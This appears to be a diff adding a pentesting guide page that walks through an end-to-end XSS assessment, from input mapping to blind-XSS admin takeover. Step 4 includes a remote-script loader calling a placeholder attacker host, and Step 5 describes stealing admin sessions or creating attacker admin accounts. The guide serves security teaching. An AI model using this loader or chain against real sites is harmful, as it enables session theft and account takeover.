@@ -1,0 +1,103 @@
+---
+title: XSS Skill-Assessment Chain
+description: A worked end-to-end XSS engagement - map inputs, find reflected and stored injection, pivot a blind sink into an admin session, and chain to account takeover.
+mitre: [T1059.007, T1185, T1539]
+d3fend: [D3-AH]
+impact: [SessionTakeover, AccountTakeover, AdminCompromise]
+owasp: [A03, A07]
+noise: moderate
+sidebar:
+  order: 10
+  label: Skill-assessment chain
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+A capstone that runs the whole cluster together on one target: enumerate every input, classify each injection by variant and context, and escalate the one that reaches a privileged user into an admin takeover. This is the order of operations to follow on a real assessment, not a specific lab's answer key - each step links to the page that does the heavy lifting.
+
+## The chain at a glance
+
+```
+map inputs → canary each → classify (reflected / stored / DOM / blind)
+          → craft per context → bypass filters if needed
+          → pick the sink that reaches an admin → exfil or act in their session
+          → account takeover
+```
+
+## Step 1 - Map every input
+
+Before testing payloads, inventory the attack surface. Miss an input and you miss the vuln.
+
+<Steps>
+
+1. Walk the app as a normal user; log every URL parameter, form field, and request header that could be reflected or stored.
+2. Note which inputs are shown back to *you* (candidate reflected/stored) and which disappear into a staff-only workflow - tickets, reports, registration-approval queues (candidate [blind](../blind-xss/)).
+3. Send a unique alphanumeric canary through each input and record where each surfaces.
+
+</Steps>
+
+## Step 2 - Classify each reflection
+
+For every canary that appears, decide the variant - the exploitation page differs by type:
+
+| Observation | Variant | Go to |
+|---|---|---|
+| Canary echoed in the HTTP response | [Reflected](../reflected/) | per-click delivery |
+| Canary persisted, shown on later views | [Stored](../stored/) | fires for every viewer |
+| Canary only in the live DOM, not View Source | [DOM-based](../dom-based/) | source→sink |
+| Canary never visible to you | [Blind](../blind-xss/) | out-of-band beacon |
+
+Then read the markup around each reflection to get its [context](/codex/web/xss/#context-theory) - body, attribute, JS string, URL, or CSS.
+
+## Step 3 - Get execution on the easy wins first
+
+Confirm the straightforward reflected/stored sinks before the blind one, to prove the app is injectable and to learn its filtering behaviour:
+
+- Craft a context-appropriate payload from [Payload construction](/codex/web/xss/payload-construction/).
+- If the obvious payload is stripped or encoded, work through [Filter bypasses](/codex/web/xss/filter-bypasses/) - what survives here usually survives in the blind sink too.
+- Prove execution with `alert(document.domain)`.
+
+<Aside type="note">
+The filtering you characterise on a *visible* sink is your best guide to the *blind* sink, where you can't watch the context. Learn the app's encoding rules where you can see them, then reuse that knowledge where you can't.
+</Aside>
+
+## Step 4 - Pivot the blind sink to an admin
+
+The high-value move: a field that an administrator reviews (support ticket, registration request, abuse report) runs your code in the admin's browser.
+
+<Steps>
+
+1. Put a per-field named remote-script loader in each staff-reviewed input (`<script src=//<ATTACKER>/ticket></script>`), with a listener up - see [Blind XSS](../blind-xss/).
+2. When the callback arrives, you know the field, the breakout that worked, and (with an XSS Hunter-style beacon) what the admin page looks like.
+3. Swap in the real payload hosted on your server.
+
+</Steps>
+
+## Step 5 - Escalate in the admin's session
+
+What the payload does depends on the app's defenses:
+
+- **Cookies readable** (`document.cookie`, not `HttpOnly`) → exfiltrate the admin session and reuse it. Receiver and callback patterns: [XSS to session](/codex/web/sessions/xss-to-session/).
+- **`HttpOnly` cookies** → you can't read the cookie, but the admin's browser still sends it automatically. Have the payload call the app's privileged endpoints directly - create an attacker admin account, elevate your own user, or reset a password - using the admin's authenticated session. If those endpoints are CSRF-protected, scrape the token from the admin DOM first: [XSS+CSRF chain](/codex/web/sessions/xss-csrf-chain/).
+
+## Step 6 - Account takeover and proof
+
+- Log in with the stolen session or the account you created, confirm admin capability, and capture evidence (the request/response of the privileged action, the beacon's screenshot of the admin panel).
+- From an admin foothold, look for the usual escalation to the host: [file upload → RCE](/codex/web/uploads/), or settings pages with command execution.
+
+## What good evidence looks like
+
+- The exact input field, variant, and context for each XSS found.
+- The working payload and, for the blind sink, the callback that proves out-of-view execution.
+- The privileged action performed and its result - this is what turns "reflected `alert`" into "admin account takeover" in the report.
+
+## Quick reference
+
+| Phase | Page |
+|---|---|
+| Inventory inputs | this page, Step 1 |
+| Classify variant | [Reflected](../reflected/) / [Stored](../stored/) / [DOM](../dom-based/) / [Blind](../blind-xss/) |
+| Craft by context | [Payload construction](/codex/web/xss/payload-construction/) |
+| Defeat filters | [Filter bypasses](/codex/web/xss/filter-bypasses/) |
+| Reach the admin | [Blind XSS](../blind-xss/) |
+| Take the session | [XSS to session](/codex/web/sessions/xss-to-session/) / [XSS+CSRF chain](/codex/web/sessions/xss-csrf-chain/) |
+| Harden against it | [Defense](../defense/) |
